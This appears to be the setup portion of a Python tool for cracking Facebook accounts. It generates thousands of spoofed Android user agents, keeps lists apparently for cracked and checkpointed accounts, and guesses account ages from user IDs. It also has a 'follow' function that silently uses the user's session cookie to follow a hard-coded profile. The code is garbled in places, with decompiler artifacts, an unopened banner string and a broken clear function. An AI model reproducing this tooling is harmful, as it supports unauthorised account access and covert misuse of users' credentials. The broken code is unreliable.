
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
    
def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Active Apps      :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        else:
            print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[] %s \x1b[1;95m  Your Expired Apps     :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text
            
            

class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)
            
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
xr = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,xr,u,b])
my_color = [
 P, M, H, K, B, U, O, N]

    \033[38;5;46m______  \x1b[38;5;196m__  ___  \033[37;1m____   \033[33;1m___     \033[34;1m_   __
   \033[38;5;46m/ ____/ \x1b[38;5;196m/  |/  / \033[37;1m/ __ \ \033[33;1m/   |   \033[34;1m/ | / /
  \033[38;5;46m/ __/   \x1b[38;5;196m/ /|_/ / \033[37;1m/ /_/ /\033[33;1m/ /| |  \033[34;1m/  |/ / 
 \033[38;5;46m/ /___  \x1b[38;5;196m/ /  / / \033[37;1m/ _, _/\033[33;1m/ ___ | \033[34;1m/ /|  /  
\033[38;5;46m/_____/ \x1b[38;5;196m/_/  /_/ \033[37;1m/_/ |_|\033[33;1m/_/  |_|\033[34;1m/_/ |_/
    \x1b[38;5;196m╔═════════════════════════════════╗
    \x1b[38;5;196m║\033[38;5;46m8888888888 888    888  .d8888b.  \x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m║\033[38;5;46m888        888    888 d88P  Y88b \x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m║\033[38;5;46m888        888    888 888    888 \x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m║\033[38;5;46m8888888    8888888888 888        \x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m║\033[38;5;46m888        888    888 888        \x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m║\033[38;5;46m888        888    888 888    888 \x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m║\033[38;5;46m888        888    888 Y88b  d88P \x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m║\033[38;5;46m8888888888 888    888  "Y8888P"  \x1b[38;5;196m║\x1b[38;5;196m
    \x1b[38;5;196m╚═════════════════════════════════╝""")
def linex():
	print(" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
loop = 0
oks = []
cps = []

def clear():
    ();time.sleep(1)

#User agents
ugen2=[]
ugen=[]
 
for xd in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
    

def samiya(uid):
    if len(uid)==15:
        if uid[:10] in ['1000000000']       :shanto = ' (*-*) 2009'
        elif uid[:9] in ['100000000']       :shanto = '√ 2009'
        elif uid[:8] in ['10000000']        :shanto = '√ 2009'
        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:shanto = '√ 2009'
        elif uid[:7] in ['1000006','1000007','1000008','1000009']:shanto = ' 2010'
        elif uid[:6] in ['100001']          :shanto = '√ 2010/2011'
        elif uid[:6] in ['100002','100003'] :shanto = '√ 2011/2012'
        elif uid[:6] in ['100004']          :shanto = '√ 2012/2013'
        elif uid[:6] in ['100005','100006'] :shanto = '√ 2013/2014'
        elif uid[:6] in ['100007','100008'] :shanto = '√ 2014/2015'
        elif uid[:6] in ['100009']          :shanto = '√ 2015'
        elif uid[:5] in ['10001']           :shanto = '√ 2015/2016'
        elif uid[:5] in ['10002']           :shanto = '√ 2016/2017'
        elif uid[:5] in ['10003']           :shanto = '√ 2018/2019'
        elif uid[:5] in ['10004']           :shanto = '√ 2019/2020'
        elif uid[:5] in ['10005']           :shanto = '√ 2020'
        elif uid[:5] in ['10006','10007','']:shanto = '√ 2021'
        elif uid[:5] in ['10008']           :shanto = '√ 2022'
        elif uid[:5] in ['10009']           :shanto = '√ 2023'
        else:shanto=''
    elif len(uid) in [9,10]:
        shanto = ' √ 2008/2009'
    elif len(uid)==8:
        shanto = '√ 2007/2008'
    elif len(uid)==7:
        shanto = '√ 2006/2007'
    else:shanto=''
    return shanto
    
    
    
# 
